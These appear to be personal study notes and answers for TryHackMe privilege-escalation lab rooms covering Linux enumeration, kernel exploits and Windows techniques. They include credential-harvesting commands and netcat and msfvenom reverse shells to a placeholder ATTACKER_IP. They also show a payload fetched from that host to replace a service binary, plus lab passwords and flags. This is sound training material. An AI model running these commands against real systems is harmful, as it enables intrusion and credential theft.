Privilege Escalation
Learn the fundamental techniques that will allow you to elevate account privileges in Linux and windows systems.

• https://tryhackme.com/room/introtoshells

• https://tryhackme.com/room/linprivesc

• https://tryhackme.com/room/windowsprivesc20

## ① What the Shell?
An introduction to sending and receiving (reverse/bind) shells when exploiting target machines.

# Task 1 Introduction


## ② The fundamentals of Linux privilege escalation. From enumeration to exploitation, get hands-on with over 8 different privilege escalation techniques.

# Task 1 Introduction
Privilege escalation is a journey. There are no silver bullets, and much depends on the specific configuration of the target system. The kernel version, installed applications, supported programming languages, other users' passwords are a few key elements that will affect your road to the root shell.
This room was designed to cover the main privilege escalation vectors and give you a better understanding of the process. This new skill will be an essential part of your arsenal whether you are participating in CTFs, taking certification exams, or working as a penetration tester.
Answer the questions below
Read the above. `No answer needed`

# Task 2 What is Privilege Escalation?
## What does "privilege escalation" mean?
At it's core, Privilege Escalation usually involves going from a lower permission account to a higher permission one. More technically, it's the exploitation of a vulnerability, design flaw, or configuration oversight in an operating system or application to gain unauthorized access to resources that are usually restricted from the users.

## Why is it important?
It's rare when performing a real-world penetration test to be able to gain a foothold (initial access) that gives you direct administrative access. Privilege escalation is crucial because it lets you gain system administrator levels of access, which allows you to perform actions such as:

   • Resetting passwords
   • Bypassing access controls to compromise protected data
   • Editing software configurations
   • Enabling persistence
   • Changing the privilege of existing (or new) users
   • Execute any administrative command

## Answer the questions below. Read the above.`No answer needed`

# Task 3 Enumeration
Note: Launch the target machine attached to this task to follow along.You can launch the target machine and access it directly from your browser. Alternatively, you can access it over SSH with the low-privilege user credentials below:

`Username: karen
Password: Password1`
Enumeration is the first step you have to take once you gain access to any system. You may have accessed the system by exploiting a critical vulnerability that resulted in root-level access or just found a way to send commands using a low privileged account. Penetration testing engagements, unlike CTF machines, don't end once you gain access to a specific system or user privilege level. As you will see, enumeration is as important during the post-compromise phase as it is before.

## hostname
The `hostname` command will return the hostname of the target machine. Although this value can easily be changed or have a relatively meaningless string (e.g. Ubuntu-3487340239), in some cases, it can provide information about the target system’s role within the corporate network (e.g. SQL-PROD-01 for a production SQL server).

## uname -a
Will print system information giving us additional detail about the kernel used by the system. This will be useful when searching for any potential kernel vulnerabilities that could lead to privilege escalation.

## /proc/version
The proc filesystem (procfs) provides information about the target system processes. You will find proc on many different Linux flavours, making it an essential tool to have in your arsenal.Looking at `/proc/version` may give you information on the kernel version and additional data such as whether a compiler (e.g. GCC) is installed. 

## /etc/issue
Systems can also be identified by looking at the `/etc/issue` file. This file usually contains some information about the operating system but can easily be customized or changed. While on the subject, any file containing system information can be customized or changed. For a clearer understanding of the system, it is always good to look at all of these.

## ps Command
The ps command is an effective way to see the running processes on a Linux system. Typing ps on your terminal will show processes for the current shell.
The output of the ps (Process Status) will show the following;

  • `PID`: The process ID (unique to the process)
  
  • `TTY`: Terminal type used by the user
  
  • `Time`: Amount of CPU time used by the process (this is NOT the time this process has been running for)
  
  • `CMD`: The command or executable running (will NOT display any command line parameter)

The “ps” command provides a few useful options.

  • `ps -A`: View all running processes
  
  • `ps axjf`: View process tree (see the tree formation until ps axjf is run below)
  
  • `ps aux`: The `aux` option will show processes for all users (a), display the user that launched the process (u), and show processes that are not attached to a terminal (x). Looking at the ps aux command output, we can have a better understanding of the system and potential vulnerabilities.

## env
The `env` command will show environmental variables.The PATH variable may have a compiler or a scripting language (e.g. Python) that could be used to run code on the target system or leveraged for privilege escalation.

## sudo -l
The target system may be configured to allow users to run some (or all) commands with root privileges. The `sudo -l` command can be used to list all commands your user can run using `sudo`.

## ls
One of the common commands used in Linux is probably `ls`. While looking for potential privilege escalation vectors, please remember to always use the `ls` command with the `-la` parameter. The example below shows how the “secret.txt” file can easily be missed using the `ls` or `ls -l` commands.

## Id
The `id` command will provide a general overview of the user’s privilege level and group memberships.It is worth remembering that the `id` command can also be used to obtain the same information for another user as seen below.

## /etc/passwd
Reading the `/etc/passwd` file can be an easy way to discover users on the system.While the output can be long and a bit intimidating, it can easily be cut and converted to a useful list for brute-force attacks. While the output can be long and a bit intimidating, it can easily be cut and converted to a useful list for brute-force attacks. Remember that this will return all users, some of which are system or service users that would not be very useful. Another approach could be to grep for “home” as real users will most likely have their folders under the “home” directory. 

## history
Looking at earlier commands with the history command can give us some idea about the target system and, albeit rarely, have stored information such as passwords or usernames.

## ifconfig
The target system may be a pivoting point to another network. The `ifconfig` command will give us information about the network interfaces of the system. The example below shows the target system has three interfaces (eth0, tun0, and tun1). Our attacking machine can reach the eth0 interface but can not directly access the two other networks. This can be confirmed using the `ip route` command to see which network routes exist. 

## netstat
Following an initial check for existing interfaces and network routes, it is worth looking into existing communications. The `netstat` command can be used with several different options to gather information on existing connections.

   • `netstat -a`: shows all listening ports and established connections.
   
   • `netstat -at` or `netstat -au` can also be used to list TCP or UDP protocols respectively.
   
   • `netstat -l`: list ports in “listening” mode. These ports are open and ready to accept incoming connections. This can be used with the “t” option to list only ports 
that are listening using the TCP protocol (below) 

   • `netstat -s`: list network usage statistics by protocol (below) This can also be used with the `-t` or `-u` options to limit the output to a specific protocol. 
   
   • `netstat -tp`: list connections with the service name and PID information.

This can also be used with the `-l` option to list listening ports (below). We can see the “PID/Program name” column is empty as this process is owned by another user.
Below is the same command run with root privileges and reveals this information as 2641/nc (netcat).
    
   • `netstat -i`: Shows interface statistics. We see below that “eth0” and “tun0” are more active than “tun1”.

 The `netstat` usage you will probably see most often in blog posts, write-ups, and courses is `netstat -ano` which could be broken down as follows;

   • `-a`: Display all sockets
   
   • `-n`: Do not resolve names
   
   • `-o`: Display timers

##  find Command
Searching the target system for important information and potential privilege escalation vectors can be fruitful. The built-in “find” command is useful and worth keeping in your arsenal.
Below are some useful examples for the “find” command.
Find files:

   • `find . -name flag1.txt`: find the file named “flag1.txt” in the current directory
   
   • `find /home -name flag1.txt`: find the file names “flag1.txt” in the /home directory
   
   • `find / -type d -name config`: find the directory named config under “/”
   
   • `find / -type f -perm 0777`: find files with the 777 permissions (files readable, writable, and executable by all users)
   
   • `find / -perm a=x`: find executable files
   
   • `find /home -user frank`: find all files for user “frank” under “/home”
   
   • `find / -mtime 10`: find files that were modified in the last 10 days
   
   • `find / -atime 10`: find files that were accessed in the last 10 days
   
   • `find / -cmin -60`: find files changed within the last hour (60 minutes)
   
   • `find / -amin -60`: find files accesses within the last hour (60 minutes)
   
   • `find / -size 50M`: find files with a 50 MB size

This command can also be used with (+) and (-) signs to specify a file that is larger or smaller than the given size. 
Folders and files that can be written to or executed from:

   • `find / -writable -type d 2>/dev/null` : Find world-writeable folders
   
   • `find / -perm -222 -type d 2>/dev/null`: Find world-writeable folders
   
   • `find / -perm -o w -type d 2>/dev/null`: Find world-writeable folders

The reason we see three different “find” commands that could potentially lead to the same result can be seen in the manual document. As you can see below, the perm parameter affects the way “find” works. 

   • `find / -perm -o x -type d 2>/dev/null`: Find world-executable folders

Find development tools and supported languages:

   • `find / -name perl*`
   
   • `find / -name python*`
   
   • `find / -name gcc*`

Find specific file permissions: 
Below is a short example used to find files that have the SUID bit set. The SUID bit allows the file to run with the privilege level of the account that owns it, rather than the account which runs it. This allows for an interesting privilege escalation path,we will see in more details on task 6. The example below is given to complete the subject on the “find” command.

    `find / -perm -u=s -type f 2>/dev/null`: Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user. 

General Linux Commands
As we are in the Linux realm, familiarity with Linux commands, in general, will be very useful. Please spend some time getting comfortable with commands such as `find`, `locate`, `grep`, `cut`, `sort`, etc.

## Answer the questions below
# What is the hostname of the target system?  `wade7363`
```
root@ip-10-10-143-69:~# ssh karen@10.10.158.74
The authenticity of host '10.10.158.74 (10.10.158.74)' can't be established.
ECDSA key fingerprint is SHA256:2Jwy90uXhJ7tauI06IwaC9BDSjK9/HsuVGpB1CDYFvw.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.158.74' (ECDSA) to the list of known hosts.
karen@10.10.158.74's password: 
Welcome to Ubuntu 14.04 LTS (GNU/Linux 3.13.0-24-generic x86_64)
$ hostname
wade7363
$ uname -a
Linux wade7363 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
```
# What is the Linux kernel version of the target system? `3.13.0-24-generic`

# What Linux is this? We can use the `cat /etc/issue` command to find the operating system version.`Ubuntu 14.04 LTS`

# What version of the Python language is installed on the system? Run the `python --version` command to see which version is installed. `2.7.6`
```
$ python
Python 2.7.6 (default, Mar 22 2014, 22:59:56) 
```
# What vulnerability seem to affect the kernel of the target system? (Enter a CVE number), did some external reseach `CVE-2015-1328`

# Task 4 Automated Enumeration Tools
Several tools can help you save time during the enumeration process. These tools should only be used to save time knowing they may miss some privilege escalation vectors. Below is a list of popular Linux enumeration tools with links to their respective Github repositories.
The target system’s environment will influence the tool you will be able to use. For example, you will not be able to run a tool written in Python if it is not installed on the target system. This is why it would be better to be familiar with a few rather than having a single go-to tool.

   • LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
   
   • LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
   
   • Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
   
   • Linux Priv Checker: https://github.com/linted/linuxprivchecker

# Answer the questions below
Install and try a few automated enumeration tools on your local Linux distribution. `No answer needed`

# Task 5 Privilege Escalation:Kernel Exploits
Privilege escalation ideally leads to root privileges. This can sometimes be achieved simply by exploiting an existing vulnerability, or in some cases by accessing another user account that has more privileges, information, or access.
Unless a single vulnerability leads to a root shell, the privilege escalation process will rely on misconfigurations and lax permissions.
The kernel on Linux systems manages the communication between components such as the memory on the system and applications. This critical function requires the kernel to have specific privileges; thus, a successful exploit will potentially lead to root privileges.
The Kernel exploit methodology is simple;

   1. Identify the kernel version
   2. Search and find an exploit code for the kernel version of the target system
   3. Run the exploit 

Although it looks simple, please remember that a failed kernel exploit can lead to a system crash. Make sure this potential outcome is acceptable within the scope of your penetration testing engagement before attempting a kernel exploit.

## Research sources:

   1. Based on your findings, you can use Google to search for an existing exploit code.
   2. Sources such as https://www.linuxkernelcves.com/cves can also be useful.
   3. Another alternative would be to use a script like LES (Linux Exploit Suggester) but remember that these tools can generate false positives (report a kernel vulnerability that does not affect the target system) or false negatives (not report any kernel vulnerabilities although the kernel is vulnerable).

## Hints/Notes:

   1. Being too specific about the kernel version when searching for exploits on Google, Exploit-db, or searchsploit
   2. Be sure you understand how the exploit code works BEFORE you launch it. Some exploit codes can make changes on the operating system that would make them unsecured in further use or make irreversible changes to the system, creating problems later. Of course, these may not be great concerns within a lab or CTF environment, but these are absolute no-nos during a real penetration testing engagement.
   3. Some exploits may require further interaction once they are run. Read all comments and instructions provided with the exploit code.
   4. You can transfer the exploit code from your machine to the target system using the `SimpleHTTPServer` Python module and `wget` respectively.

# Answer the questions below
find and use the appropriate kernel exploit to gain root privileges on the target system.`No answer needed`

  1. Identify the kernel version.
  2. Search and find an exploit code for the kernel version of the target system.
This we can find with some quick Googling. Download the exploit and move it into your `/tmp` folder.We can also get it via `searchploit`.
  3. 3. Run the exploit.Open up the terminal on your local machine, and start up the machine in Attackbox. In Attackbox, let's run the id command and take note of our current user privilege.On your local machine, we need to start up a python server so that we can send our downloaded exploit to our target machine in Attackbox. We can do this via the `python3 -m http.server 8000` command. Don't close this terminal.Open up a new tab/terminal so that we can get the IP address of our local machine. We need this to connect to our target machine. Use the `ifconfig` command and scroll down.
Cool, now we can go ahead and send our exploit that we downloaded and stored in our /tmp file to our target machine. Go to your Attackbox and first cd into your /tmp folder before connecting to your local machine. If you don't cd into /tmp first then you will get an error when trying to connect. Now, to send the exploit and make a connection we can enter the following command (replace the IP with your ifconfig IP) `wget http://yourip:8000/37292.c`.Okay, the exploit is sent. Now to convert it, we can enter the following command `gcc 37292.c -o pwned`. With our exploit converted, we can run it via the `./pwned` command.

# What is the content of the flag1.txt file? 



# Task 6 Privilege Escalation: Sudo

# Task 7 Privilege Escalation: SUID

# Task 8 Privilege Escalation: Capabilities

# Task 9 Privilege Escalation: Cron Jobs

# Task 10 Privilege Escation: PATH

# Task 11 Privilege Escalations: NFS

# Task 12 Capstone Challenge

## ③ Windows Privilege Escalation
Learn the fundamentals of Windows privilege escalation techniques.

# Task 1 Introduction
During a penetration test, you will often have access to some Windows hosts with an unprivileged user. Unprivileged users will hold limited access, including their files and folders only, and have no means to perform administrative tasks on the host, preventing you from having complete control over your target. This room covers fundamental techniques that attackers can use to elevate privileges in a Windows environment, allowing you to use any initial unprivileged foothold on a host to escalate to an administrator account, where possible.
If you want to brush up on your skills first, you can have a look through the Windows Fundamentals Module or the Hacking Windows Module.

## Answer the questions below
Click and continue learning! `No answer needed`

# Task 2 Windows Privilege Escalation
Simply put, privilege escalation consists of using given access to a host with "user A" and leveraging it to gain access to "user B" by abusing a weakness in the target system. While we will usually want "user B" to have administrative rights, there might be situations where we'll need to escalate into other unprivileged accounts before actually getting administrative privileges.
Gaining access to different accounts can be as simple as finding credentials in text files or spreadsheets left unsecured by some careless user, but that won't always be the case. Depending on the situation, we might need to abuse some of the following weaknesses:

• Misconfigurations on Windows services or scheduled tasks

• Excessive privileges assigned to our account

• Vulnerable software

• Missing Windows security patches

Before jumping into the actual techniques, let's look at the different account types on a Windows system.

## Windows Users
Windows systems mainly have two kinds of users. Depending on their access levels, we can categorise a user in one of the following groups:
	
Administrators	These users have the most privileges. They can change any system configuration parameter and access any file in the system.
Any user with administrative privileges will be part of the Administrators group. On the other hand, standard users are part of the Users group.
In addition to that, you will usually hear about some special built-in accounts used by the operating system in the context of privilege escalation:
SYSTEM / LocalSystem	An account used by the operating system to perform internal tasks. It has full access to all files and resources available on the host with even higher privileges than administrators.
Local Service	Default account used to run Windows services with "minimum" privileges. It will use anonymous connections over the network.
Network Service	Default account used to run Windows services with "minimum" privileges. It will use the computer credentials to authenticate through the network.
These accounts are created and managed by Windows, and you won't be able to use them as other regular accounts. Still, in some situations, you may gain their privileges due to exploiting specific services.
## Answer the questions below
Users that can change system configurations are part of which group? `Administrators`

The SYSTEM account has more privileges than the Administrator user (aye/nay) `Aye`

# Task 3 Harvesting Passwords from Usual Spots
The easiest way to gain access to another user is to gather credentials from a compromised machine. Such credentials could exist for many reasons, including a careless user leaving them around in plaintext files; or even stored by some software like browsers or email clients.
This task will present some known places to look for passwords on a Windows system.
Before going into the task, remember to click the Start Machine button. You will be using the same machine throughout tasks 3 to 5. If you are using the AttackBox, this is also a good moment to start it as you'll be needing it for the following tasks.

In case you prefer connecting to the target machine via RDP, you can use the following credentials:

User: `thm-unpriv`
Password: `Password321`

## Unattended Windows Installations
When installing Windows on a large number of hosts, administrators may use Windows Deployment Services, which allows for a single operating system image to be deployed to several hosts through the network. These kinds of installations are referred to as unattended installations as they don't require user interaction. Such installations require the use of an administrator account to perform the initial setup, which might end up being stored in the machine in the following locations:
• C:\Unattend.xml

• C:\Windows\Panther\Unattend.xml

• C:\Windows\Panther\Unattend\Unattend.xml

• C:\Windows\system32\sysprep.inf

• C:\Windows\system32\sysprep\sysprep.xml

As part of these files, you might encounter credentials:
```
<Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>
```
## Powershell History
Whenever a user runs a command using Powershell, it gets stored into a file that keeps a memory of past commands. This is useful for repeating commands you have used before quickly. If a user runs a command that includes a password directly as part of the Powershell command line, it can later be retrieved by using the following command from a `cmd.exe `prompt:
```
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
Note: The command above will only work from cmd.exe, as Powershell won't recognize `%userprofile%` as an environment variable. To read the file from Powershell, you'd have to replace `%userprofile% `with `$Env:userprofile`. 

### Saved Windows Credentials
Windows allows us to use other users' credentials. This function also gives the option to save these credentials on the system. The command below will list saved credentials:
```cmdkey /list```

While you can't see the actual passwords, if you notice any credentials worth trying, you can use them with the `runas` command and the `/savecred` option, as seen below.
```runas /savecred /user:admin cmd.exe```

## IIS Configuration
Internet Information Services (IIS) is the default web server on Windows installations. The configuration of websites on IIS is stored in a file called `web.config` and can store passwords for databases or configured authentication mechanisms. Depending on the installed version of IIS, we can find web.config in one of the following locations:
* C:\inetpub\wwwroot\web.config

* C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
Here is a quick way to find database connection strings on the file:
```
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

## Retrieve Credentials from Software: PuTTY
PuTTY is an SSH client commonly found on Windows systems. Instead of having to specify a connection's parameters every single time, users can store sessions where the IP, user and other configurations can be stored for later use. While PuTTY won't allow users to store their SSH password, it will store proxy configurations that include cleartext authentication credentials.
To retrieve the stored proxy credentials, you can search under the following registry key for ProxyPassword with the following command:
```
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

Note: Simon Tatham is the creator of PuTTY (and his name is part of the path), not the username for which we are retrieving the password. The stored proxy username should also be visible after running the command above.
Just as putty stores credentials, any software that stores passwords, including browsers, email clients, FTP clients, SSH clients, VNC software and others, will have methods to recover any passwords the user has saved.
## Answer the questions below
1: A password for the julia.jones user has been left on the Powershell history. What is the password?  `ZuperCkretPa5z`
```
type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
2: A web server is running on the remote host. Find any interesting password on web.config files associated with IIS. What is the password of the db_admin user?  `098n0x35skjD3`
```
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```
3: There is a saved password on your Windows credentials. Using cmdkey and runas, spawn a shell for mike.katz and retrieve the flag from his desktop.  `THM{WHAT_IS_MY_PASSWORD}`
```
runas /savecred /user:mike.katz cmd.exe
type C:\Users\mike.katz\Desktop\flag.txt
```
4: Retrieve the saved password stored in the saved PuTTY session under your profile. What is the password for the thom.smith user? `CoolPass2021`
```
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```
# Task 4 Other Quick Wins
Privilege escalation is not always a challenge. Some misconfigurations can allow you to obtain higher privileged user access and, in some cases, even administrator access. It would help if you considered these to belong more to the realm of CTF events rather than scenarios you will encounter during real penetration testing engagements. However, if none of the previously mentioned methods works, you can always go back to these.

## Scheduled Tasks
Looking into scheduled tasks on the target system, you may see a scheduled task that either lost its binary or it's using a binary you can modify.
Scheduled tasks can be listed from the command line using the `schtasks` command without any options. To retrieve detailed information about any of the services, you can use a command like the following one:
```
C:\> schtasks /query /tn vulntask /fo list /v
Folder: \
HostName:                             THM-PC1
TaskName:                             \vulntask
Task To Run:                          C:\tasks\schtask.bat
Run As User:                          taskusr1
```
You will get lots of information about the task, but what matters for us is the "Task to Run" parameter which indicates what gets executed by the scheduled task, and the "Run As User" parameter, which shows the user that will be used to execute the task.
If our current user can modify or overwrite the "Task to Run" executable, we can control what gets executed by the taskusr1 user, resulting in a simple privilege escalation. To check the file permissions on the executable, we use `icacls`:
```
C:\> icacls c:\tasks\schtask.bat
c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
                    BUILTIN\Administrators:(I)(F)
                    BUILTIN\Users:(I)(F)
```
As can be seen in the result, the BUILTIN\Users group has full access (F) over the task's binary. This means we can modify the .bat file and insert any payload we like. For your convenience, `nc64.exe` can be found on `C:\tools`. Let's change the bat file to spawn a reverse shell:
```
C:\> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```
We then start a listener on the attacker machine on the same port we indicated on our reverse shell:  `nc -lvp 4444` 
The next time the scheduled task runs, you should receive the reverse shell with taskusr1 privileges. While you probably wouldn't be able to start the task in a real scenario and would have to wait for the scheduled task to trigger, we have provided your user with permissions to start the task manually to save you some time. We can run the task with the following command:
`C:\> schtasks /run /tn vulntask`
And you will receive the reverse shell with taskusr1 privileges as expected: 
```
user@attackerpc$ nc -lvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.175.90 50649
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
wprivesc1\taskusr1
```
## AlwaysInstallElevated
Windows installer files (also known as .msi files) are used to install applications on the system. They usually run with the privilege level of the user that starts it. However, these can be configured to run with higher privileges from any user account (even unprivileged ones). This could potentially allow us to generate a malicious MSI file that would run with admin privileges.
Note: The AlwaysInstallElevated method won't work on this room's machine and it's included as information only.
This method requires two registry values to be set. You can query these from the command line using the commands below.
```
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```
To be able to exploit this vulnerability, both should be set. Otherwise, exploitation will not be possible. If these are set, you can generate a malicious .msi file using msfvenom, as seen below:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
```
As this is a reverse shell, you should also run the Metasploit Handler module configured accordingly. Once you have transferred the file you have created, you can run the installer with the command below and receive the reverse shell:
```
C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```
## Answer the questions below
What is the taskusr1 flag? `THM{TASK_COMPLETED}`

# Task 5 Abusing Service Misconfigurations

## Windows Services
Windows services are managed by the Service Control Manager (SCM). The SCM is a process in charge of managing the state of services as needed, checking the current status of any given service and generally providing a way to configure services.
Each service on a Windows machine will have an associated executable which will be run by the SCM whenever a service is started. It is important to note that service executables implement special functions to be able to communicate with the SCM, and therefore not any executable can be started as a service successfully. Each service also specifies the user account under which the service will run.
To better understand the structure of a service, let's check the apphostsvc service configuration with the `sc qc` command:
```
C:\> sc qc apphostsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: apphostsvc
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k apphost
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Application Host Helper Service
        DEPENDENCIES       :
        SERVICE_START_NAME : localSystem
```
Here we can see that the associated executable is specified through the BINARY_PATH_NAME parameter, and the account used to run the service is shown on the SERVICE_START_NAME parameter.
Services have a Discretionary Access Control List (DACL), which indicates who has permission to start, stop, pause, query status, query configuration, or reconfigure the service, amongst other privileges. The DACL can be seen from Process Hacker (available on your machine's desktop):

All of the services configurations are stored on the registry under `HKLM\SYSTEM\CurrentControlSet\Services\`:
A subkey exists for every service in the system. Again, we can see the associated executable on the ImagePath value and the account used to start the service on the ObjectName value. If a DACL has been configured for the service, it will be stored in a subkey called Security. As you have guessed by now, only administrators can modify such registry entries by default.

## Insecure Permissions on Service Executable
If the executable associated with a service has weak permissions that allow an attacker to modify or replace it, the attacker can gain the privileges of the service's account trivially.
To understand how this works, let's look at a vulnerability found on Splinterware System Scheduler. To start, we will query the service configuration using `sc`:
```
C:\> sc qc WindowsScheduler
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: windowsscheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Scheduler Service
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcuser1
```
We can see that the service installed by the vulnerable software runs as svcuser1 and the executable associated with the service is in `C:\Progra~2\System~1\WService.exe`. We then proceed to check the permissions on the executable:
```
C:\Users\thm-unpriv>icacls C:\PROGRA~2\SYSTEM~1\WService.exe
C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
                                  NT AUTHORITY\SYSTEM:(I)(F)
                                  BUILTIN\Administrators:(I)(F)
                                  BUILTIN\Users:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```
And here we have something interesting. The Everyone group has modify permissions (M) on the service's executable. This means we can simply overwrite it with any payload of our preference, and the service will execute it with the privileges of the configured user account.

Let's generate an exe-service payload using msfvenom and serve it through a python webserver:
```
user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe

user@attackerpc$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
We can then pull the payload from Powershell with the following command:
```
wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
```
Once the payload is in the Windows server, we proceed to replace the service executable with our payload. Since we need another user to execute our payload, we'll want to grant full permissions to the Everyone group as well:
```
C:\> cd C:\PROGRA~2\SYSTEM~1\

C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> move C:\Users\thm-unpriv\rev-svc.exe WService.exe
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> icacls WService.exe /grant Everyone:F
        Successfully processed 1 files.
```
We start a reverse listener on our attacker machine: `user@attackerpc$ nc -lvp 4445` And finally, restart the service. While in a normal scenario, you would likely have to wait for a service restart, you have been assigned privileges to restart the service yourself to save you some time. Use the following commands from a cmd.exe command prompt: 
```
C:\> sc stop windowsscheduler
C:\> sc start windowsscheduler
```
Note: PowerShell has `sc` as an alias to `Set-Content`, therefore you need to use `sc.exe` in order to control services with PowerShell this way.

As a result, you'll get a reverse shell with svcusr1 privileges:
```
user@attackerpc$ nc -lvp 4445
Listening on 0.0.0.0 4445
Connection received on 10.10.175.90 50649
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
wprivesc1\svcusr1
```
## Unquoted Service Paths
When we can't directly write into service executables as before, there might still be a chance to force a service into running arbitrary executables by using a rather obscure feature.
When working with Windows services, a very particular behaviour occurs when the service is configured to point to an "unquoted" executable. By unquoted, we mean that the path of the associated executable isn't properly quoted to account for spaces on the command.
As an example, let's look at the difference between two services (these services are used as examples only and might not be available in your machine). The first service will use a proper quotation so that the SCM knows without a doubt that it has to execute the binary file pointed by `”C:\Program Files\RealVNC\VNC Server\vncserver.exe”`, followed by the given parameters:
```
C:\> sc qc "vncserver"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: vncserver
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : "C:\Program Files\RealVNC\VNC Server\vncserver.exe" -service
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : VNC Server
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```
Remember: PowerShell has 'sc' as an alias to 'Set-Content', therefore you need to use 'sc.exe' to control services if you are in a PowerShell prompt.
Now let's look at another service without proper quotation:
```
C:\> sc qc "disk sorter enterprise"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: disk sorter enterprise
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Disk Sorter Enterprise
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcusr2
```
When the SCM tries to execute the associated binary, a problem arises. Since there are spaces on the name of the "Disk Sorter Enterprise" folder, the command becomes ambiguous, and the SCM doesn't know which of the following you are trying to execute:

		
Command	Argument 1	Argument 2
C:\MyPrograms\Disk.exe	Sorter	Enterprise\bin\disksrs.exe
C:\MyPrograms\Disk Sorter.exe	Enterprise\bin\disksrs.exe	
This has to do with how the command prompt parses a command. Usually, when you send a command, spaces are used as argument separators unless they are part of a quoted string. This means the "right" interpretation of the unquoted command would be to execute `C:\\MyPrograms\\Disk.exe `and take the rest as arguments.
Instead of failing as it probably should, SCM tries to help the user and starts searching for each of the binaries in the order shown in the table:
1. First, search for `C:\\MyPrograms\\Disk.exe`. If it exists, the service will run this executable.

2. If the latter doesn't exist, it will then search for `C:\\MyPrograms\\Disk Sorter.exe`. If it exists, the service will run this executable.

3. If the latter doesn't exist, it will then search for `C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe`. This option is expected to succeed and will typically be run in a default installation.

From this behaviour, the problem becomes evident. If an attacker creates any of the executables that are searched for before the expected service executable, they can force the service to run an arbitrary executable.
While this sounds trivial, most of the service executables will be installed under `C:\Program Files` or `C:\Program Files (x86)` by default, which isn't writable by unprivileged users. This prevents any vulnerable service from being exploited. There are exceptions to this rule: - Some installers change the permissions on the installed folders, making the services vulnerable. - An administrator might decide to install the service binaries in a non-default path. If such a path is world-writable, the vulnerability can be exploited.
In our case, the Administrator installed the Disk Sorter binaries under `c:\MyPrograms`. By default, this inherits the permissions of the `C:\ `directory, which allows any user to create files and folders in it. We can check this using `icacls`:
```
C:\>icacls c:\MyPrograms
c:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
              BUILTIN\Administrators:(I)(OI)(CI)(F)
              BUILTIN\Users:(I)(OI)(CI)(RX)
              BUILTIN\Users:(I)(CI)(AD)
              BUILTIN\Users:(I)(CI)(WD)
              CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files
```
The `BUILTIN\\Users` group has AD and WD privileges, allowing the user to create subdirectories and files, respectively.
